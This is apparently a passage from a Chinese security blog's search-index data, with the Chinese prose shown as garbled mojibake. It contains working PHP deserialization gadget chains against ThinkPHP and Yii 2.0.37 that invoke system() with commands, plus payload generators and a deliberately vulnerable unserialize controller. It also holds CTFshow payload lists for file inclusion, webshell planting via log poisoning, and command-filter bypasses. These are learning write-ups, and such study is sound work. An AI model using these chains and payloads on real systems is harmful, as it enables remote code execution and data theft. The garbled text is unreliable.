Model { } } namespace think{ class Request { protected $hook = []; protected $filter; protected $config = [ // è¡¨å•è¯·æ±‚ç±»å‹ä¼ªè£…å˜é‡ &#39;var_method&#39; =&gt; &#39;_method&#39;, // è¡¨å•ajaxä¼ªè£…å˜é‡ &#39;var_ajax&#39; =&gt; &#39;&#39;, // è¡¨å•pjaxä¼ªè£…å˜é‡ &#39;var_pjax&#39; =&gt; &#39;_pjax&#39;, // PATHINFOå˜é‡å ç”¨äºå…¼å®¹æ¨¡å¼ &#39;var_pathinfo&#39; =&gt; &#39;s&#39;, // å…¼å®¹PATH_INFOè·å– &#39;pathinfo_fetch&#39; =&gt; [&#39;ORIG_PATH_INFO&#39;, &#39;REDIRECT_PATH_INFO&#39;, &#39;REDIRECT_URL&#39;], // é»˜è®¤å…¨å±€è¿‡æ»¤æ–¹æ³• ç”¨é€—å·åˆ†éš”å¤šä¸ª &#39;default_filter&#39; =&gt; &#39;&#39;, // åŸŸåæ ¹ï¼Œå¦‚thinkphp.cn &#39;url_domain_root&#39; =&gt; &#39;&#39;, // HTTPSä»£ç†æ ‡è¯† &#39;https_agent_name&#39; =&gt; &#39;&#39;, // IPä»£ç†è·å–æ ‡è¯† &#39;http_agent_ip&#39; =&gt; &#39;HTTP_X_REAL_IP&#39;, // URLä¼ªé™æ€åç¼€ &#39;url_html_suffix&#39; =&gt; &#39;html&#39;, ]; public function __construct(){ $this-&gt;hook[&#39;visible&#39;]=[$this,&#39;isAjax&#39;]; $this-&gt;filter=&quot;system&quot;; } } } namespace{ use think\\process\\pipes\\Windows; echo base64_encode(serialize(new Windows())); } æ€»ç»“ï¼šè¿™æ¡é“¾æ˜¯tpç¬¬ä¸€æ¡å®Œå…¨è‡ªå·±æƒ³äº†ä¸€éçš„ã€‚éš¾åº¦ç¡®å®æ¯”ä¹‹å‰çœ‹çš„yiié‚£äº›éƒ½é«˜ï¼Œä¸è¿‡æ”¶è·å¾ˆå¤§ã€‚","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"/categories/æŠ€æœ¯/"}],"tags":[{"name":"Real","slug":"Real","permalink":"/tags/Real/"}],"keywords":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"/categories/æŠ€æœ¯/"}]},{"title":"Yii unserialize","slug":"Yii-unserialize","date":"2021-09-21T07:38:39.000Z","updated":"2021-09-23T08:10:43.789Z","comments":true,"path":"2021/09/21/Yii-unserialize/","link":"","permalink":"/2021/09/21/Yii-unserialize/","excerpt":"","text":"è¯´æ¥æƒ­æ„§ï¼Œæš‘å‡å› ä¸ºå®ä¹ å’Œçœ¼ç›åšæ¿€å…‰ç­‰å„ç§åŸå› ï¼Œè¿œè¿œæ²¡æœ‰å®Œæˆè®¡åˆ’ã€‚è¿™å­¦æœŸè¦æ”¶æ”¶å¿ƒå¥½å¥½å­¦ä¹ äº†ã€‚ ç¯å¢ƒæ­å»ºï¼Œgithubç›´æ¥ä¸‹è½½ï¼šhttps://github.com/yiisoft/yii2/releases/download/2.0.37/yii-basic-app-2.0.37.tgz ä¿®æ”¹ä¸‹é…ç½®æ–‡ä»¶config/web.phpï¼›ç»™cookieValidationKeyä¿®æ”¹ä¸€ä¸ªä»»æ„å€¼ï¼Œä¸ç„¶ä¼šæŠ¥é”™ã€‚ å¯åŠ¨ï¼Œé»˜è®¤æ˜¯8080ç«¯å£ã€‚php yii serve â€“port=9999 é“¾ä¸€å…¨å±€å¯»æ‰¾__destructï¼š æˆ‘è¿™é‡Œç›´æ¥æ‰¾äº†å‚è€ƒé“¾æ¥é‡Œé¢ä¸€æ ·çš„ç‚¹ï¼Œåˆ«çš„ç‚¹çœ‹äº†å‡ ä¸ªæ„Ÿè§‰ä¹Ÿæ˜¯æœ‰å¸Œæœ›çš„ï¼ˆcall_user_funcç­‰ï¼‰ã€‚ __destructè°ƒç”¨resetï¼ŒdataReaderå¯æ§ï¼Œæ‰€ä»¥resetè°ƒç”¨closeã€‚è·Ÿè¿›close è¿™ä¸ªcloseæ²¡ä»€ä¹ˆå¯ä»¥å¯åˆ©ç”¨çš„ç‚¹ï¼Œå†å¾€ä¸‹è·Ÿä¸€æ­¥å°±æ˜¯æ­»è·¯ã€‚ä½†æ˜¯å› ä¸ºdataReaderå‚æ•°å¯æ§ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥å¯»æ‰¾å…¶ä»–å¯ä»¥åˆ©ç”¨çš„closeå‡½æ•°ã€‚ å…¨å±€æœç´¢æ‰¾åˆ°DbSessioné‡Œçš„close getIsActiveå¯¹å½“å‰çŠ¶æ€è¿›è¡Œäº†ä¸€ä¸ªåˆ¤åˆ«ã€‚åªæœ‰å½“Yiiçš„debugå’Œgiiè¿™ä¸¤ä¸ªé»˜è®¤æ‰©å±•éƒ½å­˜åœ¨ï¼ˆä¸ä¸€å®šè¦å¼€å¯ï¼‰æ—¶ï¼Œè¿™é‡Œè¿”å›trueã€‚å¦åˆ™è¿”å›falseã€‚ è¿”å›trueåè°ƒç”¨composeFieldsæ–¹æ³• å¯ä»¥çœ‹åˆ°æœ‰ä¸ªcall_user_funcï¼Œå†çœ‹ä¸‹å®ƒçš„å‚æ•°æ˜¯ä¸æ˜¯å¯æ§çš„ï¼Œä¸å¯æ§ã€‚ ç±»ä¼¼äºcall_user_func($this-&gt;test);æˆ–è€…$test();è¿™ç§åªèƒ½è°ƒç”¨æ²¡æœ‰å‚æ•°çš„å‡½æ•°çš„ç»“æ„ã€‚å‡ºæ¥ç®€å•çš„è°ƒç”¨phpinfoä»¥å¤–ï¼Œæˆ‘ä»¬ä¹Ÿå¯ä»¥è€ƒè™‘å°†å˜é‡èµ‹å€¼ä¸º[(new test), â€œaaaâ€]è¿™æ ·çš„ä¸€ä¸ªæ•°ç»„ã€‚å°±å¯ä»¥è°ƒç”¨testç±»ä¸­çš„aaaå…¬å…±æ–¹æ³•ã€‚ ç›´æ¥æœç´¢å«æœ‰call_user_functionçš„æ— å‚å‡½æ•°æ‰¾åˆ°äº†yii\\rest\\IndexActionä¸­çš„runæ–¹æ³• æ‰€æœ‰å‚æ•°å‡å¯æ§ï¼Œä¹Ÿå°±æ˜¯è¯´ç›´æ¥è°ƒç”¨è¿™ä¸ªå³å¯ã€‚æ„é€ ä¸€ä¸‹ï¼š &lt;?php namespace yii\\db{ use yii\\web\\DbSession; class BatchQueryResult { private $_dataReader; public function __construct(){ $this-&gt;_dataReader=new DbSession(); } } } namespace yii\\web{ use yii\\rest\\IndexAction; class DbSession{ public $writeCallback; public function __construct() { $Troy3e=new IndexAction(); $this-&gt;writeCallback=[$Troy3e,&#39;run&#39;]; } } } namespace yii\\rest{ class IndexAction{ public $checkAccess; public $id; public function __construct(){ $this-&gt;checkAccess=&#39;system&#39;; $this-&gt;id=&#39;whoami&#39;; } } } namespace{ use yii\\db\\BatchQueryResult; echo base64_encode(serialize(new BatchQueryResult())); } ?&gt; ç„¶ååœ¨controllersç›®å½•ä¸‹æ·»åŠ ä¸ªæ§åˆ¶å™¨ &lt;?php namespace app\\controllers; class SerializeController extends \\yii\\web\\Controller { public function actionSerialize($data){ return unserialize(base64_decode($data)); } } ?&gt; é“¾äºŒè¿˜æ˜¯ä»é“¾ä¸€çš„destructå…¥æ‰‹ï¼Œä¸Šä¸€æ¡ç”¨äº†closeæ–¹æ³•ï¼Œè¿™æ¬¡å°è¯•ä¸€ä¸‹callã€‚å…¨å±€æœç´¢__callï¼Œç„¶ååœ¨\\vendor\\fzaninotto\\faker\\src\\Faker\\Generator.phpæ‰¾åˆ°äº†ä¸ªåˆé€‚çš„ï¼š è·Ÿè¿›formatï¼Œçœ‹åˆ°äº†call_user_func_array çœ‹ä¸‹è¿™ä¸ªæ˜¯ä¸æ˜¯å¯æ§çš„å‚æ•° å¾ˆæ˜æ˜¾è¿™æ˜¯å¯æ§çš„ã€‚ä½†æ˜¯reseté‡Œé¢closeæ˜¯æ— å‚æ–¹æ³•ï¼Œä¼ åˆ°callé‡Œé¢methodå°±ç­‰äºcloseï¼Œè€Œattributesä¸ºç©ºã€‚åˆ°è¿™é‡Œå…¶å®å°±å¾ˆç†Ÿæ‚‰äº†ï¼Œå› ä¸ºè¿™ä¸ªå’Œé“¾ä¸€ä¸€æ ·ï¼Œåªè¦è°ƒç”¨ä¸€ä¸ªåŒ…å«call_user_funcçš„å‚æ•°å¯æ§çš„æ— å‚æ–¹æ³•å³å¯ã€‚ï¼ˆæ–¹æ³•ä¸å”¯ä¸€ï¼‰ &lt;?php namespace yii\\db{ use Faker\\Generator; class BatchQueryResult{ private $_dataReader; public function __construct() { $this-&gt;_dataReader=new Generator(); } } } namespace Faker{ use yii\\rest\\IndexAction; class Generator{ protected $formatters; public function __construct() { $Troy3e=new IndexAction(); $this-&gt;formatters[&#39;close&#39;]=[$Troy3e,&#39;run&#39;]; } } } namespace yii\\rest{ class IndexAction{ public $checkAccess; public $id; public function __construct(){ $this-&gt;checkAccess=&#39;system&#39;; $this-&gt;id=&#39;whoami&#39;; } } } namespace{ use yii\\db\\BatchQueryResult; echo base64_encode(serialize(new BatchQueryResult())); } ?&gt; é“¾ä¸‰è¿æ‰¾äº†ä¸¤ä¸ªdestructï¼Œå°è¯•ä¸‹wakeupè¡Œä¸è¡Œã€‚å…¨å±€æœä¸‹æ¥wakeupçœ‹ä¸Šå»èƒ½ç”¨çš„å°±å››ä¸ªè¿™æ¬¡æ‰¾çš„æ˜¯\\vendor\\symfony\\string\\UnicodeString.phpä¸­çš„wakeupã€‚ ç™¾åº¦ä¸€æ³¢normalizer_is_normalizedè¿™ä¸ªå‡½æ•°ï¼Œè§£é‡Šæ˜¯æ£€æŸ¥æ‰€ç»™çš„å­—ç¬¦ä¸²æ˜¯å¦æ˜¯æ ‡å‡†æ ¼å¼ã€‚è€å®è¯´ï¼Œè¿™ä¸ªè°ƒç”¨toStringæˆ‘çœ‹äº†ä¸€ä¼šå„¿æ‰ååº”è¿‡æ¥æ˜¯æ€ä¹ˆä¸€å›äº‹ã€‚ã€‚ç”Ÿç–äº†ã€‚ å…¨å±€æœç´¢toStringï¼Œå¤ªå¤šäº†ï¼Œæ‰¾ä¸è¿‡æ¥ï¼Œç›´æ¥å‚è€ƒäº†å¸ˆå‚…ä»¬ç»™çš„ï¼ˆæœ‰ç©ºä¸€å®šè¦ç ”ç©¶ä¸€ä¸‹å…¨å±€æœç´¢çš„tricksï¼š valueå¯æ§ï¼Œåˆæ˜¯ä¸€æ³¢æ— å‚æ–¹æ³•ï¼Œè°ƒç”¨IndexAtioné‡Œçš„runæ–¹æ³•å³å¯ã€‚ &lt;?php namespace Symfony\\Component\\String{ use yii\\rest\\IndexAction; class UnicodeString{ protected $string; public function __construct(){ $Troy3e = new LazyString(); $this-&gt;string = $Troy3e; } } class LazyString{ private $value; public function __construct(){ $Troy3e1 = new IndexAction(); $this-&gt;value = [$Troy3e1,&#39;run&#39;]; } } } namespace yii\\rest{ class IndexAction{ public $checkAccess; public $id; public function __construct(){ $this-&gt;checkAccess=&#39;system&#39;; $this-&gt;id=&#39;calc.exe&#39;; } } } namespace { $Troy3e2 = new Symfony\\Component\\String\\UnicodeString(); echo base64_encode(serialize($Troy3e2)); } å°±å…ˆå†™ä¸‰æ¡å§ï¼Œæ¯•ç«Ÿä¸æ˜¯æ€»ç»“yiiçš„åšå®¢ï¼Œåªæ˜¯å­¦ä¹ ä¸€ä¸‹å®¡è®¡ã€‚yiiçš„è¿™å‡ æ¡é“¾å­è¿˜æ˜¯éå¸¸ç®€å•çš„ï¼ŒåŸºæœ¬æ²¡æœ‰éš¾åº¦ã€‚ å‚è€ƒï¼šhttps://xz.aliyun.com/t/8082http://www.wangqingzheng.com/anquanke/29/217929.html","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"/categories/æŠ€æœ¯/"}],"tags":[],"keywords":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"/categories/æŠ€æœ¯/"}]},{"title":"Web78-117æ–‡ä»¶åŒ…å«","slug":"Web78-117æ–‡ä»¶åŒ…å«","date":"2021-07-26T08:19:06.000Z","updated":"2021-07-26T08:26:06.107Z","comments":true,"path":"2021/07/26/Web78-117æ–‡ä»¶åŒ…å«/","link":"","permalink":"/2021/07/26/Web78-117æ–‡ä»¶åŒ…å«/","excerpt":"","text":"Web78php://filter/read=convert.base64-encode/resource=./flag.php Web79data://text/plain;base64,PD9waHAgc3lzdGVtKCdjYXQgZmxhZy5waHAnKTs= Web80åŒ…å«æ—¥å¿—æ–‡ä»¶ è¿›è¡Œgetshell æ—¥å¿—æ–‡ä»¶è·¯å¾„ï¼š ?file=/var/log/nginx/access.logæ”¹uaå†™é©¬ã€‚ Web81åŒä¸Š Web117å‰é¢çš„è¦ä¹ˆé‡å¤è¦ä¹ˆæ˜¯å¾ˆä¹…ä»¥å‰å°±åšè¿‡çš„ä¸œè¥¿ï¼Œå°±ä¸å†™äº†ã€‚ è¿˜æ˜¯æ­»äº¡exitç»•è¿‡ï¼Œä½†æ˜¯è¿‡æ»¤äº†å¥½å¤šä¸œè¥¿ã€‚æˆ‘çœ‹äº†å‡ºé¢˜äººç»™çš„è§£æ³•ï¼Œç”¨çš„ä¸€ä¸ªå…¶ä»–çš„å­—ç¬¦ç¼–ç ï¼Œè¿˜ä¸é”™ã€‚ä½†å…¶å®è¿™é‡Œæ ¹æœ¬ä¸ç”¨è¿™ä¹ˆéº»çƒ¦ï¼Œfile_put_contentsè¿™ä¸œè¥¿å®ƒæœ¬èº«å°±æ˜¯äºŒæ¬¡ç¼–ç ï¼Œæ‰€ä»¥ç›´æ¥ï¼š http://2ee28656-2bd6-4372-89f0-0b0505f20d16.challenge.ctf.show:8080/?file=php://filter/write=%7%33tring.%7%32ot13/resource=2.php å³å¯ã€‚ å¯èƒ½æœ‰äººéœ€è¦äºŒæ¬¡ç¼–ç çš„è„šæœ¬ï¼š &lt;?php $string = &#39;php://filter/write=string.rot13/resource=2.php&#39;; //éœ€è¦äºŒæ¬¡ç¼–ç çš„å­—ç¬¦æˆ–å­—ç¬¦ä¸² $result = &#39;&#39;; for($i=0;$i&lt;strlen($string);$i++){ $char = $string[$i]; for ($ascii1 = 0; $ascii1 &lt; 256; $ascii1++) { for ($ascii2 = 0; $ascii2 &lt; 256; $ascii2++) { $aaa = &#39;%&#39;.$ascii1.&#39;%&#39;.$ascii2; if(urldecode(urldecode($aaa)) == $char){ echo $char.&#39;: &#39;.$aaa; echo &quot;\\n&quot;; $result = $result.$aaa; break 2; } } } } echo $result; ?&gt; å‡ºé¢˜äººçš„è§£ä¹Ÿæ”¾ä¸€ä¸‹ï¼Œä¸è¿‡æˆ‘ä¼°è®¡æˆ‘è®°ä¸ä½ï¼š","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"/categories/æŠ€æœ¯/"}],"tags":[],"keywords":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"/categories/æŠ€æœ¯/"}]},{"title":"Web29-124å‘½ä»¤æ‰§è¡Œ","slug":"Web29-124å‘½ä»¤æ‰§è¡Œ","date":"2021-07-26T08:18:52.000Z","updated":"2021-07-26T08:51:24.756Z","comments":true,"path":"2021/07/26/Web29-124å‘½ä»¤æ‰§è¡Œ/","link":"","permalink":"/2021/07/26/Web29-124å‘½ä»¤æ‰§è¡Œ/","excerpt":"","text":"å‘½ä»¤æ‰§è¡Œå°±å¾ˆæœ‰æ„æ€äº†~ç®€å•çš„å°±ä¸èµ˜è¿°äº†ï¼Œå¯èƒ½å¯¹æ–°æ‰‹ä¸å¤ªå‹å¥½ã€‚ Web29c=system(&#39;cat fla*&#39;); Web30c=echo `cat fl*`; Web31c=echo%09`tac%09fla*`%3B Web32c=include$_GET[1]?&gt;&amp;1=php://filter/read=convert.base64-encode/resource=flag.php Web33c=include$_GET[1]?&gt;&amp;1=php://filter/read=convert.base64-encode/resource=flag.php Web34c=include$_GET[a]?&gt;&amp;a=php://filter/read=convert.base64-encode/resource=flag.php Web35c=include$_GET[a]?&gt;&amp;a=php://filter/read=convert.base64-encode/resource=flag.php Web36c=include$_GET[a]?&gt;&amp;a=php://filter/read=convert.base64-encode/resource=flag.php Web37c=data://text/palin,&lt;?php system(&#39;cat fl*&#39;);?&gt; Web38c=data://text/plain,&lt;?=system(&#39;cat fla*&#39;);?&gt; Web39c=data://text/palin,&lt;?php system(&#39;cat fl*&#39;);?&gt; Web40scandir(â€™.â€™):æ‰«æå½“å‰ç›®å½•localeconv() å‡½æ•°è¿”å›ä¸€åŒ…å«æœ¬åœ°æ•°å­—åŠè´§å¸æ ¼å¼ä¿¡æ¯çš„æ•°ç»„ã€‚è€Œæ•°ç»„ç¬¬ä¸€é¡¹å°±æ˜¯.pos(),current():è¿”å›æ•°ç»„ç¬¬ä¸€ä¸ªå€¼ c=print_r(scandir(pos(localeconv())));æŸ¥çœ‹ç›®å½• è¯»flag c=highlight_file(next(array_reverse(scandir(pos(localeconv()))))); c=show_source(array_rand(array_flip(scandir(pos(localeconv())))));å…ˆäº¤æ¢é”®å€¼é”®åï¼Œç„¶åéšæœºè¿”å›ã€‚ æœ€åä¸€ä¸ªæ–¹æ³•å¾ˆæœ‰æ„æ€ session_start(): å‘Šè¯‰PHPä½¿ç”¨session;session_id(): è·å–åˆ°å½“å‰çš„session_idå€¼ï¼›æ‰‹åŠ¨è®¾ç½®cookieä¸­PHPSESSID=flag.phpï¼› http://f34e0b19-a97f-44d7-a3e5-9fcaf4913f00.challenge.ctf.show:8080/?c=session_start();system(session_id()); PHPSESSID=ls Web41ç”¨æˆ–è¿ç®—æ„é€ å³å¯ï¼Œè„šæœ¬è‡ªå·±éšä¾¿å†™ä¸€ä¸ªå°±è¡Œã€‚è¦æ³¨æ„çš„æ˜¯è¿™è¾¹å‘½ä»¤æ‰§è¡Œéœ€è¦é—­åˆå’Œæ³¨é‡Šã€‚ c=&#39;|||||||||||&#39;);(&#39;%13%19%13%14%05%0D&#39;|&#39;%60%60%60%60%60%60&#39;)((&#39;%03%01%14&#39;|&#39;%60%60%60&#39;).&#39; &#39;.(&#39;%06%0C%01%07%02%10%08%10&#39;|&#39;%60%60%60%60%2C%60%60%60&#39;));// Web42è¿™æ¡å‘½ä»¤çš„æ„æ€å°±æ˜¯åœ¨åå°æ‰§è¡Œè¿™ä¸ªç¨‹åº,å¹¶å°†é”™è¯¯è¾“å‡º2é‡å®šå‘åˆ°æ ‡å‡†è¾“å‡º1,ç„¶åå°†æ ‡å‡†è¾“å‡º1å…¨éƒ¨æ”¾åˆ°/dev/nullæ–‡ä»¶,ä¹Ÿå°±æ˜¯æ¸…ç©º.æ‰€ä»¥å¯ä»¥çœ‹å‡ºâ€ &gt;/dev/null 2&gt;&amp;1 â€œå¸¸ç”¨æ¥é¿å…shellå‘½ä»¤æˆ–è€…ç¨‹åºç­‰è¿è¡Œä¸­æœ‰å†…å®¹è¾“å‡ºã€‚ æˆªæ–­å³å¯c=cat flag.php%0a psï¼š%26ä»¥åŠ||ä¹Ÿèƒ½æˆªæ–­ã€‚ Web43c=tac flag.php%0A Web44c=tac f*%0A Web45c=tac%09f*%0A Web46c=tac%09fl\\ag.php%0A Web47c=tac%09fl\\ag.php%0A Web48c=tac%09fl\\ag.php%0A Web49c=tac%09fl\\ag.php%0A Web50c=tac&lt;&gt;fl\\ag.php%0A Web51c=nl&lt;&gt;fl\\ag.php%0A Web52c=nl${IFS}/fl\\ag%0Aæ³¨ï¼šflag.phpæ˜¯ä¸ªå‡flag Web53c=câ€™â€™at${IFS}fl\\ag.ph\\p Web54è¡¨è¾¾å¼ .* å°±æ˜¯å•ä¸ªå­—ç¬¦åŒ¹é…ä»»æ„æ¬¡ï¼Œå³è´ªå©ªåŒ¹é…ã€‚æ¯”å¦‚caatã€c\\atã€câ€™â€™atç­‰ã€‚è§£å†³æ–¹æ³•æ˜¯ç›´æ¥è°ƒç”¨binç›®å½•ä¸‹çš„å‘½ä»¤c=/bin/ca?${IFS}f??????? Web55 ä¸Šä¼ shå‘½ä»¤è‡³tmpç›®å½•ï¼Œç„¶åç”¨linuxé€šé…ç¬¦åŒ¹é…åˆ°å¯¹åº”æ–‡ä»¶.ä»£è¡¨sourceæ‰§è¡Œshå‘½ä»¤ã€‚ pç‰›ï¼šhttps://www.leavesongs.com/PENETRATION/webshell-without-alphanum-advanced.html#php5shell ä¹Ÿå¯ä»¥ç›´æ¥é€šé…ç¬¦/???/????64 ???????? /bin/base64 flag.php/???/???/????2 ???????? /usr/bin/bzip2 flag.php Web56ä¸Šé¢˜pç¥çš„è§£æ³•ã€‚ Web57å­—æ¯æ•°å­—åŸºæœ¬éƒ½æ²¡äº†ï¼Œä½†æ˜¯flagè¢«æ¢æˆäº†36ï¼Œæ‰€ä»¥æƒ³åŠæ³•æ„é€ 36å³å¯ã€‚æ‹¬å·å’Œ$è¿˜åœ¨ï¼šåŒå°æ‹¬å· (( )) æ˜¯ Bash Shell ä¸­ä¸“é—¨ç”¨æ¥è¿›è¡Œæ•´æ•°è¿ç®—çš„å‘½ä»¤ï¼Œå®ƒçš„æ•ˆç‡å¾ˆé«˜ï¼Œå†™æ³•çµæ´»ï¼Œæ˜¯ä¼ä¸šè¿ç»´ä¸­å¸¸ç”¨çš„è¿ç®—å‘½ä»¤ã€‚é€šä¿—åœ°è®²ï¼Œå°±æ˜¯å°†æ•°å­¦è¿ç®—è¡¨è¾¾å¼æ”¾åœ¨((å’Œ))ä¹‹é—´ã€‚è¡¨è¾¾å¼å¯ä»¥åªæœ‰ä¸€ä¸ªï¼Œä¹Ÿå¯ä»¥æœ‰å¤šä¸ªï¼Œå¤šä¸ªè¡¨è¾¾å¼ä¹‹é—´ä»¥é€—å·,åˆ†éš”ã€‚å¯¹äºå¤šä¸ªè¡¨è¾¾å¼çš„æƒ…å†µï¼Œä»¥æœ€åä¸€ä¸ªè¡¨è¾¾å¼çš„å€¼ä½œä¸ºæ•´ä¸ª (( ))å‘½ä»¤çš„æ‰§è¡Œç»“æœã€‚å¯ä»¥ä½¿ç”¨$è·å– (( )) å‘½ä»¤çš„ç»“æœï¼Œè¿™å’Œä½¿ç”¨$è·å¾—å˜é‡å€¼æ˜¯ç±»ä¼¼çš„ã€‚å¯ä»¥åœ¨ (( )) å‰é¢åŠ ä¸Š$ç¬¦å·è·å– (( )) å‘½ä»¤çš„æ‰§è¡Œç»“æœï¼Œä¹Ÿå³è·å–æ•´ä¸ªè¡¨è¾¾å¼çš„å€¼ã€‚ä»¥ c=$((a+b)) ä¸ºä¾‹ï¼Œå³å°† a+b è¿™ä¸ªè¡¨è¾¾å¼çš„è¿ç®—ç»“æœèµ‹å€¼ç»™å˜é‡ cã€‚æ³¨æ„ï¼Œç±»ä¼¼ c=((a+b)) è¿™æ ·çš„å†™æ³•æ˜¯é”™è¯¯çš„ï¼Œä¸åŠ $å°±ä¸èƒ½å–å¾—è¡¨è¾¾å¼çš„ç»“æœã€‚ $(())æ˜¯0$((~$(()))) 0å–åæ˜¯-1$((~-37)) -37å–åæ˜¯36$(($((~$(())))$((~$(()))))) è¿èµ·æ¥é»˜è®¤ç›¸åŠ æ˜¯-2æ‰€ä»¥37ä¸ª-1è¿èµ·æ¥å°±è¡Œã€‚ $((~$(( $((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(()))) )))) Web58c=highlight_file(â€˜flag.phpâ€™); Web5958çš„payloadä¹Ÿè¡Œï¼Œå…¶ä»–å§¿åŠ¿ï¼š c=highlight_file(next(array_reverse(scandir(pos(localeconv()))))); //é€šè¿‡å•ä¸€å‡½æ•°è¯»å–æ–‡ä»¶ c=echo file_get_contents(&quot;flag.php&quot;); c=readfile(&quot;flag.php&quot;); c=var_dump(file(&#39;flag.php&#39;)); c=print_r(file(&#39;flag.php&#39;)); //è¿™é‡Œåšä¸€ä¸ªè§£é‡Š`file â€” æŠŠæ•´ä¸ªæ–‡ä»¶è¯»å…¥ä¸€ä¸ªæ•°ç»„ä¸­` é€šè¿‡fopenå»è¯»å–æ–‡ä»¶å†…å®¹ï¼Œè¿™é‡Œä»‹ç»ä¸‹å‡½æ•° fread() fgets() fgetc() fgetss() fgetcsv() gpassthru() payload: c=$a=fopen(&quot;flag.php&quot;,&quot;r&quot;);while (!feof($a)) {$line = fgets($a);echo $line;}//ä¸€è¡Œä¸€è¡Œè¯»å– c=$a=fopen(&quot;flag.php&quot;,&quot;r&quot;);while (!feof($a)) {$line = fgetc($a);echo $line;}//ä¸€ä¸ªä¸€ä¸ªå­—ç¬¦è¯»å– c=$a=fopen(&quot;flag.php&quot;,&quot;r&quot;);while (!feof($a)) {$line = fgetcsv($a);var_dump($line);} Web60copy(&quot;flag.php&quot;,&quot;flag.txt&quot;); rename(&quot;flag.php&quot;,&quot;flag.txt&quot;); c=$a=fopen(&quot;flag.php&quot;,&quot;r&quot;);while (!feof($a)) {$line = fgetc($a);echo $line;} c=$a=fopen(&quot;flag.php&quot;,&quot;r&quot;);while (!feof($a)) {$line = fgetcsv($a);print_r($line);} Web61c=highlight_file(&#39;flag.php&#39;); Web62c=highlight_file(&#39;flag.php&#39;); Web63c=highlight_file(&#39;flag.php&#39;); Web64c=highlight_file(&#39;flag.php&#39;); Web65c=highlight_file(&#39;flag.php&#39;); Web66c=highlight_file(&#39;/flag.txt&#39;); Web67c=highlight_file(&#39;/flag.txt&#39;); Web68è¯»ç›®å½• var_dump(scandir(&#39;/&#39;)); c=$a=new DirectoryIterator(&#39;glob:///*&#39;);foreach($a as $f){echo($f-&gt;__toString().&quot; &quot;);} ç¬¬äºŒä¸ªpayloadè§£é‡Šä¸€ä¸‹ï¼šå¤–éƒ¨è°ƒç”¨DirectoryIteratoræ—¶ï¼Œä¼ å…¥ä¸€ä¸ªç›®å½•è·¯å¾„å­—ç¬¦ä¸²ï¼Œå®ä¾‹åŒ–DirectoryIteratorç±»ã€‚ç”¨foreachæˆ–è€…whileéå†ç›®å½•ï¼š &lt;?php //éå†ç›®å½•ä¸‹çš„æ‰€æœ‰æ–‡ä»¶ $dir = new DirectoryIterator(dirname(__FILE__)); //1ã€foreachç›´æ¥å¾ªç¯ foreach ($dir as $file){ if($file-&gt;isFile()){ echo $file-&gt;getFilename().&quot;&lt;br /&gt;&quot;; } } glob:// åˆ™æ˜¯æŸ¥æ‰¾åŒ¹é…çš„æ–‡ä»¶è·¯å¾„æ¨¡å¼ï¼Œglob:///*ä»£è¡¨æ ¹ç›®å½•ä¸‹çš„æ‰€æœ‰æ–‡ä»¶ã€‚æœ€åè¾“å‡ºç›´æ¥echo $fä¹Ÿæ˜¯å¯ä»¥çš„ã€‚ ç„¶åincludeå³å¯ã€‚ Web69include &#39;/flag.txt&#39;; Web70include &#39;/flag.txt&#39;; Web71 c=include &#39;/flag.txt&#39;;exit(); æå‰ç»“æŸ Web72è¿™é‡Œæ²¡æ³•ç›´æ¥è¯»äº†ï¼Œåº”è¯¥æ˜¯è®¾ç½®äº†openbase_dirã€‚é¦–å…ˆæ‰«ç›®å½•ï¼š c=$a=new DirectoryIterator(&#39;glob:///*&#39;);foreach($a as $f){echo($f-&gt;__toString().&quot; &quot;);};exit(); ç„¶åincludeä¸€ä¸‹flag0.txtï¼Œgï¼Œåˆå¿˜äº†è®¾ç½®äº†openbaseã€‚èšå‰‘è¯•ä¸€ä¸‹ã€‚èšå‰‘ä¹Ÿgäº†ã€‚ çœ‹äº†ä¸‹å¸ˆå‚…ä»¬çš„åšå®¢ï¼Œç”¨çš„æ˜¯è¿™ä¸ªï¼š è„šæœ¬ç½‘ä¸Šéƒ½æœ‰ Web73flagc.txt Web74flagx.txt Web75åˆ©ç”¨mysql load_fileè¯»æ–‡ä»¶ c=try {$dbh = new PDO(&#39;mysql:host=localhost;dbname=ctftraining&#39;, &#39;root&#39;,&#39;root&#39;);foreach($dbh-&gt;query(&#39;select load_file(&quot;/flag36.txt&quot;)&#39;) as $row){echo($row[0]).&quot;|&quot;; }$dbh = null;}catch (PDOException $e) {echo $e-&gt;getMessage();exit(0);}exit(0); Web76c=try {$dbh = new PDO(&#39;mysql:host=localhost;dbname=ctftraining&#39;, &#39;root&#39;,&#39;root&#39;);foreach($dbh-&gt;query(&#39;select load_file(&quot;/flag36d.txt&quot;)&#39;) as $row){echo($row[0]).&quot;|&quot;; }$dbh = null;}catch (PDOException $e) {echo $e-&gt;getMessage();exit(0);}exit(0); Web77https://www.php.cn/php-weizijiaocheng-415807.html c=$ffi = FFI::cdef(&quot;int system(const char *command);&quot;);$a=&#39;/readflag &gt; 1.txt&#39;;$ffi-&gt;system($a);exit(); php&gt;=7.4ã€‚ æ— è¯­äº†ã€‚ã€‚ã€‚ä¸‹é¢è¿™éƒ¨åˆ†æ”¾ä¸Šå»hexoå°±æŠ¥é”™ã€‚ã€‚ã€‚ Web123è€é¢˜äº†ï¼Œé€šè¿‡æ•°å­¦å‡½æ•°æ„é€ å‘½ä»¤ã€‚ æŠ„yu22xå¸ˆå‚…çš„åšå®¢äº†ï¼Œå†™çš„å¾ˆè¯¦ç»†ï¼š base_convert(number,frombase,tobase); å‚æ•° æè¿° number å¿…éœ€ã€‚è§„å®šè¦è½¬æ¢çš„æ•°ã€‚ frombase 